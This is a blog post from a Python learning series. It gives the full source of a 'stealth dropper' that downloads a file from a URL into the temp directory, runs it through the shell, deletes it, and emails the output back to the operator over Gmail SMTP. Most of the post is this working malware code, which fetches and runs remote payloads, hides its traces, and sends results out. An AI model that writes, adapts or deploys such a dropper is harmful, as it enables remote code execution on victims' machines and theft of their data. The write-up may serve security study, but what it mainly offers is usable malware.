---
title: Malware - Stealth Dropper
date: 2021-08-19 10:45:47 +07:00
categories: python_101
#modified: 20-08-29 09:24:47 +07:00
#tags: [blog, netlify, jekyll, github]
description: Downloads, executes, reports and cleans up after.
---

<p align="center">
 <img src="https://i.imgflip.com/4/3pt59r.jpg">
</p>

## A Cross Platform python script that downloads, executes, reports and cleans up after.


- We implement:

  > the tempfile module - to find the temp dir.

  > the os module - to use platform independent functions like chdir to change to the temp dir.

  > the subprocess module - to execute and remove the created file.

  > the smtplib module - to create an SMTP instance to send our reports back to our proviced mail address.




### Code:

```python
#!/usr/bin/env python

import requests, subprocess, smtplib, os, tempfile, argparse

# Cross-Platform
# Works by default with google's SMTP


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--download-file", dest="download", help="File to Download")
    parser.add_argument("-a", "--args", dest="args", help="args if provided by Download file")
    parser.add_argument("-e", "--email", dest="email", help="Email-ID to recieve report")
    parser.add_argument("-p", "--password", dest="password", help="Password for provided Email-ID")
    options = parser.parse_args()
    if not options.download:
        # code to handle error
        parser.error("\n[-] Please specify a valid download url,  use --help for info.")
    if not options.email:
        # code to handle error
        parser.error("\n[-] Please specify a valid Email-ID,  use --help for info.")
    return options


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    # Open File with write and binary mode
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)
    return file_name

def send_mail(email, password, message):
    # Google's SMTP definition
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


print("""\n\n\n
                                                        ğ•¾ğ–™ğ–Šğ–†ğ–‘ğ–™ğ–-ğ•¯ğ–—ğ–”ğ–•ğ–•ğ–Šğ–—
    """)


print("\n{-} Finding /tmp dir.")
options = get_arguments()


# Find /tmp dir on OS
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
print("{+} /tmp dir found!")

# Download
file_name = download(options.download)
print("\n{+} File " + file_name + " has been succesfully dropped!")
# Execute
result = subprocess.check_output(file_name + " " +  options.args, shell=True)
print("{+} File " + file_name + " has been succesfully Executed!")
# Remove
os.remove(file_name)
print("{+} File " + file_name + " has been succesfully Removed!")
# Report
send_mail(options.email, options.password, result)
print("\n\n{!} Report sent to: " + options.email)
```

### Output:

_Console:_

![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/coding/python/Malware-Stealth_Dropper/dropper.png)

_Report:_

![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/coding/python/Malware-Stealth_Dropper/dropper2.png)




